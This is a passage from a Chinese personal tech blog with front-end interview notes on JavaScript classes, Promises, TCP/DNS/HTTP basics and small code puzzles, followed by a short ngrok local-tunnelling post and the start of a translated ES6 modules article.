class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">static</span> sayHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I'm parent!"</span> + <span class="keyword">this</span>.name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">static</span> testFunc()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'emm...Parent test static Func'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">      sayChildHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I'm child "</span> + <span class="keyword">this</span>.name)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">static</span> sayHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"override parent method !,I'm sayHello Method"</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">static</span> testFunc2() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">super</span>.testFunc() + <span class="string">'fsdafasdf'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ParentClass.sayHello(); <span class="comment">// success print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> a = <span class="keyword">new</span> ParentClass(<span class="string">'test'</span>);</span><br><span class="line">    a.sayHello() <span class="comment">// throw error</span></span><br><span class="line"></span><br><span class="line">    SubClass.sayHello(); <span class="comment">// 同名 static 可以继承且覆盖</span></span><br><span class="line">    </span><br><span class="line">    SubClass.testFunc2(); <span class="comment">// 可以继承</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> testA = <span class="keyword">new</span> SubClass(<span class="string">'CRPER'</span>);</span><br></pre></td></tr></table></figure><p>私有变量这个我没答出来,只是说了下没有private这个关键字和基本用下划线的人为区分</p><p>所以回来只是找了下相关的资料,发现有一个比较好的模拟方案,就是WeakMap;</p><p>WeakMap可以避免内存泄露,当没有被值引用的时候会自动给内存寄存器回收了.</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const <span class="literal">_</span> = <span class="keyword">new</span> <span class="type">WeakMap</span>(); <span class="comment">// 实例化,value 必须为对象,有 delete,get,has,set四个方法,看名字都知道了</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestWeakMap</span> </span>&#123;</span><br><span class="line">  constructor(id, barcode) &#123;</span><br><span class="line">    <span class="literal">_</span>.<span class="keyword">set</span>(<span class="built_in">this</span>, &#123; id,barcode &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  testFunc() &#123;</span><br><span class="line">    let &#123; id,barcode &#125; = <span class="literal">_</span>.<span class="keyword">get</span>(<span class="built_in">this</span>); <span class="comment">// 获取对应的值</span></span><br><span class="line">    <span class="keyword">return</span> &#123; id,barcode &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="谈谈你对-Promise-的理解-和-ajax-有关系么"><a href="#谈谈你对-Promise-的理解-和-ajax-有关系么" class="headerlink" title="谈谈你对 Promise 的理解? 和 ajax 有关系么?"></a>谈谈你对 Promise 的理解? 和 ajax 有关系么?</h2><p>Promise和ajax没有半毛钱直接关系. promise只是为了解决”回调地狱”而诞生的;</p><p>平时结合 ajax是为了更好的梳理和控制流程…这里我们简单梳理下..</p><p>Promise有三种状态,Pending/resolve()/reject();</p><p>一些需要注意的小点,如下</p><ul><li>在 Pending 转为另外两种之一的状态时候,状态不可在改变..</li><li>Promise的 then为异步.而(new Promise())构造函数内为同步</li><li>Promise的catch不能捕获任意情况的错误(比如 then 里面的setTimout内手动抛出一个Error)</li><li>Promise的 resolve若是传入值而非函数,会发生值穿透的现象</li></ul><p>Promise 还有一些自带的方法,比如race,all,前者有任一一个解析完毕就返回,后者所有解析完毕返回…</p><p><a href="https://juejin.im/post/5a04066351882517c416715d" target="_blank" rel="noopener">Promise 必知必会（十道题）</a><br><a href="http://liubin.org/promises-book/" target="_blank" rel="noopener">JavaScript Promise迷你书（中文版）</a></p><h2 id="谈谈你对-TCP-的理解"><a href="#谈谈你对-TCP-的理解" class="headerlink" title="谈谈你对 TCP 的理解"></a>谈谈你对 TCP 的理解</h2><pre><code>Q: TCP 是在哪个OSI 的哪个层!通讯过程是全双工还是半双工(单工)?
A: 传输层,全双工
Q: TCP的通讯的过程是怎么样的!
A: 整个过程是三次握手,四次挥手..
Q: 你说的没错,说说整个过程如何?
A: 举个栗子,我把 TCP 比做两个人用对讲机沟通(大白话)..三次握手就是.A1(吼叫方,客户端)想要呼叫 A2(控制室的某某,服务端)..
A1对着对讲机说&quot;over over ,听到请回答&quot;(第一次,请求应答) ...
A2收到回应&quot;收到收到,你说&quot;(第二次,确认应答)
A1开始巴拉巴拉个不停而 A2没拒绝(第三次,通讯建立)

而四次挥手则是两者确认互相倾述完毕的过程..
A1说:&quot;控制室,报告完毕了&quot;(第一次挥手)
A2说:&quot;知道了...那么你废话说完就好好听我指挥....巴拉巴拉..&quot;(第二次挥手)
A1此时等待控制室说完毕,而控制室等回应(第三次挥手)
等到 A1回馈控制室确认都知道完毕了..(第四次挥手)...
</code></pre><p>以上都是瞎掰,可能有些地方描述不当,笑笑就好了<br>TCP没有百分百建立成功的,会造成链接失败的情况有很多..<br>比如长时间没应答(A1吼了半天没有反应或者 A2应答了而 A1不再鸟它)..亦或者丢包(对讲机也没了);<br>TCP 协议相关的文章网上很多,若是要更加全面的了解该协议请自行引擎..<br>我建议阅读&lt;&lt;TCP-IP详解卷1~卷3&gt;&gt;,这个是网络圣经…很厚…我只看了一丢丢..</p><h2 id="TCP-你了解了-那么-OSI-七层协议和五层网络架构应该知道吧"><a href="#TCP-你了解了-那么-OSI-七层协议和五层网络架构应该知道吧" class="headerlink" title="TCP 你了解了,那么 OSI 七层协议和五层网络架构应该知道吧?"></a>TCP 你了解了,那么 OSI 七层协议和五层网络架构应该知道吧?</h2><p>对于这类的问题我也只能大体点了下,毕竟不是专攻网络这块的…<br>OSI 七层涵盖:物理层,数据链路层,网络层,传输层,会话层,表示层,应用层;<br>五层模型就是”会话,表示,应用层”同为一层;<br>Q: DNS 的大体的执行流程了解么,属于哪个层级?工作在哪个层级?<br>DNS 属于应用层协议, 至于TCP/UDP哪一层上面跑,看情况 , 大体的执行流程是这样的;</p><p>优先读取浏览器缓存<br>其次系统的缓存<br>都没有的情况下,找本地hosts文件(比如你写了映射关系优先寻找)<br>再没有的情况找最近的域名解析服务器<br>再没有则扩大访问,最终找到根服务器,还是没有就失败了..</p><p>DNS 的解析的几个记录类型需要了解:</p><p>A: 域名直接到 IP<br>CNAME: 可以多个域名映射到一个主机,类似在 Github Page就用 CNAME 指向<br>MX: 邮件交换记录,用的不多,一般搭建邮件服务器才会用到<br>NS: 解析服务记录,可以设置权重,指定谁解析<br>TTL: 就是生存时间(也叫缓存时间),一般的域名解析商都有默认值,也可以人为设置<br>TXT: 一般指某个主机名或域名的说明</p><p>回来我找下相关的资料,有兴趣的可以深入了解下,传送门如下:</p><p><a href="http://www.cnblogs.com/kevingrace/p/5909719.html" target="_blank" rel="noopener">梳理Linux下OSI七层网络与TCP/IP五层网络架构</a><br><a href="https://www.html5rocks.com/zh/tutorials/file/xhr2/" target="_blank" rel="noopener">TCP/IP（六）应用层（DNS和HTTP协议）</a><br><a href="https://zhuanlan.zhihu.com/p/28305778" target="_blank" rel="noopener">DNS域名解析解剖</a></p><h2 id="HTTP-和-HTTPS-有何差异-听说过-SPDY-么"><a href="#HTTP-和-HTTPS-有何差异-听说过-SPDY-么" class="headerlink" title="HTTP 和 HTTPS 有何差异? 听说过 SPDY 么?"></a>HTTP 和 HTTPS 有何差异? 听说过 SPDY 么?</h2><p>我只是粗浅的回答了下…<br>HTTP相对于 HTTPS来说,速度较快且开销较小(没有 SSL/TSL) 对接,默认是80端口;<br>HTTP容易遭受域名劫持,而HTTPS相对来说就较为安全但开销较大(数据以加密的形式传递),默认端口为443..<br>HTTP是明文跑在 TCP 上.而HTTPS跑在SSL/TLS应用层之下,TCP上的<br>Q: 那么 HTTPS中的TLS/SSL是如何保护数据的…<br>一般有两种形式,非对称加密,生成公钥和私钥,私钥丢服务器,公钥每次请求去比对验证;<br>更严谨的采用 CA(Certificate Authority),给密钥签名….<br>Q: SPDY 听说过么.什么来的?<br>谷歌推行一种协议(HTTP 之下SSL之上[TCP]),可以算是HTTP2的前身,有这么些优点</p><p>压缩数据(HEADER)<br>多路复用<br>优先级(可以给请求设置优先级)</p><p>而这些优点基本 HTTP2也继承下来了..<br>Q: 你对 HTTP 的状态吗了解多少…<br>这里列举一丢丢常见的..</p><p>1XX: 一般用来判断协议更换或者确认服务端收到请求这些</p><p>100: 服务端收到部分请求,若是没有拒绝的情况下可以继续传递后续内容<br>101: 客户端请求变换协议,服务端收到确认</p><p>2xx: 请求成功,是否创建链接,请求是否接受,是否有内容这些</p><p>200: 请求成功<br>201: 请求创建成功和资源创建成功</p><p>3XX: 一般用来判断重定向和缓存</p><p>301: 所有请求已经转移到新的 url(永久重定向),会被缓存<br>302: 临时重定向,不会被缓存<br>304: 本地资源暂未改动,优先使用本地的(根据If-Modified-Since or If-Match去比对服务器的资源,缓存)</p><p>4XX: 一般用来确认授权信息,请求是否出错,页面是否丢失</p><p>400: 请求出错<br>401: 未授权,不能读取某些资源<br>403: 阻止访问,一般也是权限问题<br>404: 页面丢失,资源没找到<br>408: 请求超时<br>415: 媒介类型不被支持，服务器不会接受请求。</p><p>5XX: 基本都是服务端的错误</p><p>500: 服务端错误<br>502: 网关错误<br>504: 网关超时</p><h2 id="几个短而让我印象深刻的题"><a href="#几个短而让我印象深刻的题" class="headerlink" title="几个短而让我印象深刻的题"></a>几个短而让我印象深刻的题</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>))&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// !("a" i n window)  , 返回 true</span></span><br><span class="line"><span class="comment">// 留言小伙伴的刨析,非常感谢,还是涉及变量提升的问题</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> var a;</span></span><br><span class="line"><span class="comment">if(!("a" in window))&#123;</span></span><br><span class="line"><span class="comment">    a = 10;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 变种题</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span>  x = c =  b = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(x.a); <span class="comment">// error , a is not defined</span></span><br><span class="line"><span class="built_in">console</span>.log(c,b) <span class="comment">// &#123;a: 1&#125; &#123;a: 1&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">count</span> = 0;</span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">typeof</span> <span class="keyword">count</span> === <span class="string">"number"</span>); <span class="comment">// true , 这个不用解释了</span></span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(!!<span class="keyword">typeof</span> <span class="keyword">count</span> === <span class="string">"number"</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里涉及到就是优先级和布尔值的问题</span></span><br><span class="line"><span class="comment">// typeof count 就是字符串"number"</span></span><br><span class="line"><span class="comment">// !!是转为布尔值(三目运算符的变种),非空字符串布尔值为 true</span></span><br><span class="line"><span class="comment">// 最后才=== 比较 , true === "number" , return false</span></span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = b = <span class="number">3</span>;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> a === <span class="string">"undefined"</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> b === <span class="string">"undefined"</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里涉及的就是立即执行和闭包的问题,还有变量提升,运算符执行方向(=号自左向右)</span></span><br><span class="line"><span class="comment">// 那个函数可以拆成这样</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  <span class="title">var</span> <span class="title">a</span></span>; <span class="comment">/* 局部变量,外部没法访问*/</span></span><br><span class="line">  b = <span class="number">3</span>; <span class="comment">/* 全局变量,so . window.b === 3 , 外部可以访问到*/</span></span><br><span class="line">  a = b;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若是改成这样,这道题应该是对的</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> b === <span class="string">"number"</span> &amp;&amp; b ===<span class="number">3</span></span><br><span class="line">); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">something</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.a = something;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">  foo:foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj1.foo(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj1.a) <span class="comment">// 2 ,此时的 this 上下文还在 obj1内,若是 obj1.foo 先保存当做引用再执行传参,则上下文为 window</span></span><br><span class="line"></span><br><span class="line">obj1.foo.call(obj2,<span class="number">3</span>); <span class="comment">// 用 call 强行改变上下文为 obj2内</span></span><br><span class="line"><span class="built_in">console</span>.log(obj2.a); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  bar = <span class="keyword">new</span> obj1.foo(<span class="number">4</span>); <span class="comment">// 这里产生了一个实例</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1.a); <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(bar.a); <span class="comment">// 4;  new的绑定比隐式和显式绑定优先级更高</span></span><br></pre></td></tr></table></figure><h2 id="还有一道题目是涉及事件循环-执行的优先权的"><a href="#还有一道题目是涉及事件循环-执行的优先权的" class="headerlink" title="还有一道题目是涉及事件循环,执行的优先权的.."></a>还有一道题目是涉及事件循环,执行的优先权的..</h2><p>就是 macrotask和microtask 相关的, 具体记不起来了..那时候给了答案虽然对了.</p><p>要说出所以然,给秀了一脸..回来找了下相关的资料;</p><p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">JavaScript 运行机制详解：再谈Event Loop</a><br><a href="https://juejin.im/post/5a2e21486fb9a0450407d370" target="_blank" rel="noopener">深入理解事件循环和异步流程控制</a><br><a href="https://juejin.im/post/5984816a518825265674c8f6" target="_blank" rel="noopener">所有你需要知道的关于完全理解 Node.js 事件循环及其度量</a></p><h2 id="你对基础算法这块掌握的如何…"><a href="#你对基础算法这块掌握的如何…" class="headerlink" title="你对基础算法这块掌握的如何…."></a>你对基础算法这块掌握的如何….</h2><pre><code>来,这纸给你,写个快排试试...
</code></pre><p><a href="https://juejin.im/post/57dcd394a22b9d00610c5ec8" target="_blank" rel="noopener">十大经典排序算法总结（JavaScript描述）</a></p><h2 id="设计模式你了解多少"><a href="#设计模式你了解多少" class="headerlink" title="设计模式你了解多少?"></a>设计模式你了解多少?</h2><p><a href="http://www.cnblogs.com/tugenhua0707/p/5198407.html" target="_blank" rel="noopener">Javascript常用的设计模式详解</a><br><a href="https://github.com/ToNiQian/js-design-pattern" target="_blank" rel="noopener">js-design-pattern</a></p><h2 id="思维拓展题-你有两个玻璃球-有个100米的高楼-求玻璃球在哪个楼层扔下会碎-用的次数最少"><a href="#思维拓展题-你有两个玻璃球-有个100米的高楼-求玻璃球在哪个楼层扔下会碎-用的次数最少" class="headerlink" title="思维拓展题: 你有两个玻璃球,有个100米的高楼,求玻璃球在哪个楼层扔下会碎(用的次数最少);"></a>思维拓展题: 你有两个玻璃球,有个100米的高楼,求玻璃球在哪个楼层扔下会碎(用的次数最少);</h2><p>问题的要点: 玻璃球碎(有限个数) ,确定楼层数 , 最少次数 =&gt; 就是求最优的公式</p><p>在这道题上给秀的一脸,我的第一次的思路</p><pre><code>先折半,就变成[1-50][51-100], 那就是 1+50 = 51次 ...
</code></pre><p>面试大佬说,你用了快排的思路就肯定不是最优的..</p><pre><code>憋了许久,想到开平方 \sqrt[2]{100} , 这样的话,最多只要20次
</code></pre><p>然后又说给我三个球,在1000米的高楼,判断多少次…但是根据我上面的话,</p><pre><code>开立方, \sqrt[3]{1000} , 那最多不超过30次;
</code></pre><p>至于第一次丢球的位置如何确定, 就是开平之后的值作为一个区间.</p><p>若 N 个球和 M 米的大厦…第一次丢球的高度区间就是这个了\frac{m}{\sqrt[n]{m}}</p><p>面试大佬说这个还可以…那就暂且告一段落</p><p>…回来用万能的搜索引擎找了下..最优方案+最少次数需要考虑的东西很多,没那么简单</p><p>传送门: <a href="https://www.zhihu.com/question/31855632" target="_blank" rel="noopener">知乎有人讨论了这个问题</a>;</p><p>但是高数还老师了..这种帖子看的一脸懵逼….抽空再好好研究下</p><h2 id="你对优化这块了解多少"><a href="#你对优化这块了解多少" class="headerlink" title="你对优化这块了解多少?"></a>你对优化这块了解多少?</h2><p>大体常见的手段了解.</p><p>比如从客户端着手的:</p><ul><li>压缩代码(JS/CSS),压缩图片</li><li>合并一些小图片(css sprite)</li><li>若是打包的代码尽可能切割成多个 chunk,减少单一 chunk过大</li><li>静态文件采用 cdn 引入</li><li>HTTP的缓存头使用的合理</li><li>减小第三方库的依赖</li><li>对于代码应该考虑性能来编写,比如使用requestAnimationFrame绘制动画,尽可能减少页面重绘(DOM 改变)</li><li>渐进升级,引入preload这些预加载资源</li><li>看情况用server worker来缓存资源(比如移动端打算搞 PWA)</li></ul><p>比如从服务端着手:</p><ul><li>带宽,域名解析, 多域名解析等</li><li>页面做服务端渲染,减小对浏览器的依赖(不用客户端解析)</li><li>渐进升级,比如引入 HTTP2(多路复用,头部压缩这些可以明显加快加载速度)</li></ul><p>当然,这是这些都是很片面的点到…实际工作中去开展要复杂的多;</p><p>比如我们要多个维度去考虑的话,要去优化 DOM 的绘制时间,资源的加载时间,域名解析这些;</p><p>要全面的优化一个项目是一个大工程…</p><p>还有一些题目记不起来了,就没辙了…还有一些题目是看你个人发挥的,没法写,比如</p><pre><code>Q: 让你来为公司的一个项目做技术选型,你会怎么做,为什么?
Q: MVVM 和 MVC 的差异? 听说过 MVP?
Q: React,Angular,Vue的比较? 等等...
</code></pre><p>面试的过程中磕磕碰碰才能发现自身的很多不足和需要去努力的方向.</p><p>此篇文章暂未停更,随时会更新,因为作为技术渣的我还木有找到工作;</p><p>在找到工作之前会一直更新面试碰到问到的问题;</p><p>有不对之处请留言,会及时跟进修正,谢谢各位大佬</p><p><a href="https://juejin.im/post/5a998991f265da237f1dbdf9" target="_blank" rel="noopener">2018春招前端面试: 闯关记</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316018/weixin-create-local-server-env/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316018/weixin-create-local-server-env/" itemprop="url">使用ngrok搭建微信开发本地测试环境</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-06T19:14:30+08:00">2018-03-06</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">145</span></span></div></header><div class="post-body" itemprop="articleBody"><p>微信开发的时候，必须要输入URL而且必须是外网域名，导致本地没法调试，不过使用ngrok可以创建一个内网穿透的服务器，这样就可以使用本地的服务器调试了。</p><p><a href="https://ngrok.com/download" target="_blank" rel="noopener">ngrock下载地址</a></p><p>开启 ssh 端口</p><p><code>./ngrok tcp 22</code></p><p>这时在外网即可 ssh 访问本机：</p><p><code>ssh user@0.tcp.ngrok.io -p17840</code></p><p>开启 http(s) 服务：</p><p><code>./ngrok http 80</code></p><p>免费版并不能自定义域名，每次启动时的端口都会改变</p><p><a href="https://juejin.im/entry/58adb743b123db006730e691" target="_blank" rel="noopener">CentOS6 搭建自己的 ngrok 服务</a></p><p><a href="https://www.ngrok.cc/" target="_blank" rel="noopener">https://www.ngrok.cc/</a><br><a href="https://natapp.cn/" target="_blank" rel="noopener">https://natapp.cn/</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316016/es6-in-depth-modules/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316016/es6-in-depth-modules/" itemprop="url">深入理解ES6的模块 -【翻译】</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-06T13:37:57+08:00">2018-03-06</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">3,642</span></span></div></header><div class="post-body" itemprop="articleBody"><p>回想2007年，那时候我刚加入Mozilla’s JavaScript团队，那时候的一个典型的JavaScript程序只需要一行代码，听起来像个笑话。</p><p>两年后，Google Maps发布。在这之前，JavaScript主要用来做表单的验证，你用来处理<code>&lt;input onchange=&gt;</code>这个程序当然只需要一行。</p><p>时过境迁，JavaScript项目已经发展到让人叹为观止，社区涌现了许多帮助开发的工具。但是最迫切需要的是一个模块系统，它能将你的工作分散到不同的文件与目录中，在需要的时候他们能彼此之间相互访问，并且可以有效的加载所有代码。所以JavaScript有模块系统这很正常，而且还有多个模块系统（CommonJS、AMD、CMD、UMD）。不仅如此，它还有几个包管理器（npm、bower），用来安装软件还能拷贝一些深度依赖。你可能认为ES6和它的新模块系统出现得有点晚。</p><p>那我们来看看ES6为现存的模块系统添加了什么，以及未来的标准和工具能否建立在这个系统上。首先，让我们看看ES6的模块是什么样子的。</p><h2 id="模块的基础知识"><a href="#模块的基础知识" class="headerlink" title="模块的基础知识"></a>模块的基础知识</h2><p>ES6模块是一个包含了JS代码的文件。没有所谓的<code>module</code>关键词，一个模块看起来和一个脚本文件没什么不一样，除了一下两个区别：</p><ul><li>ES6的模块自动开启严格模式，即使你没有写<code>&quot;use strict&quot;;</code>；</li><li>在模块中，你可以使用<code>import</code>和<code>exprot</code>。</li></ul><p>先来谈谈export。在默认情况下，模块中所有的声明都是私有的，如果你希望模块中的某些声明是公开的，并在其他模块中使用它们，你就必须导出它们。这里有一些实现方法，最简单的是添加<code>export</code>关键字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kittydar.js - Find the locations of all the cats in an image.</span></span><br><span class="line"><span class="comment">// (Heather Arthur wrote this library for real)</span></span><br><span class="line"><span class="comment">// (but she didn't use modules, because it was 2013)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">detectCats</span>(<span class="params">canvas, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> kittydar = <span class="keyword">new</span> Kittydar(options);</span><br><span class="line">  <span class="keyword">return</span> kittydar.detectCats(canvas);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Kittydar</span> </span>&#123;</span><br><span class="line">  ... several methods doing image processing ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This helper function isn't exported.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resizeCanvas</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span 